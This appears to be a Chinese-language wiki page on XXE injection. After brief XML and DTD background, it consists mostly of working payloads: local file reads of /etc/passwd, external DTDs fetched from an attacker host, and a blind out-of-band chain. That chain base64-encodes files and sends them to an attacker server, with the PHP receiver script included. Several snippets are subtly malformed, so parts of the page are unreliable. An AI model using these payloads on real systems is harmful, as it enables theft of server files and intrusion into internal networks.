---
description: XML External Entity Injection
---

# XXE

攻击者可以通过 XML 的外部实体来获取服务器中本应被保护的数据。

对于XXE漏洞最为关键的部分是**DTD文档类型**，DTD 的作用是定义 XML 文档的合法构建模块。

当允许引用外部实体时，通过恶意构造，可以导致任意文件读取、执行系统命令、探测内网端口、攻击内网网站等危害。DTD 可以在 XML 文档内声明，也可以外部引用；libxml2.9.1及以后，默认不再解析外部实体。



### XML基础知识

XML文档结构包括`XML声明` ，`DTD文档类型定义` ，`文档元素` 。

```
// xml声明
<?xml version="1.0">
```

```
// 文档类型定义
<!DOCTYPE  note [
<!ELEMENT note (to, from, heading, body)>
<!ELEMENT to   (#PCDATA)>                     
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body   (#PCDATA)>
]>
```

```
// 文档元素
<note>
<to>George</to>
<from>John</from>                                
<heading>Reminder</heading>
<body>Don’t forget the meeting</body>
```

### 利用方式

#### 有回显XXE

```
<?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE c [
      <!ENTITY file SYSTEM "file:///etc/passwd">
  ]>
```

#### Bypass

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY  % d  SYSTEM "http://ip/evil.dtd" >
%d;
]>
<root>
<name>&b;</name>
</root>
```

```
// evil.dtd
<!ENTITY b SYSTEM "file:///etc/passwd">
```

#### blind XXE

```
  <?xml version="1.0" encoding="utf-8"?>
     <!DOCTYPE c [
        <!ENTITY  % a "<!ENTITY b 'http://www.xxx.com'>"
        %a;
     ]>
 <c>&b;</c>
```

#### Bypass

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY  % file  SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
<!ENTITY  % remote  SYSTEM "http://ip/evil2.dtd" >
%remote;
%all;
%send;
]>
```

```
// vps test.php
<?php
$file = "./test.txt";
$content = base64_decode($_GET['file']); 
file_put_contents($file , $content);
echo "\n"; 
?>
```

```
// vps evil2.dtd
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM 'http://ip/xxe/test.php?file=%file;'>"
>
```
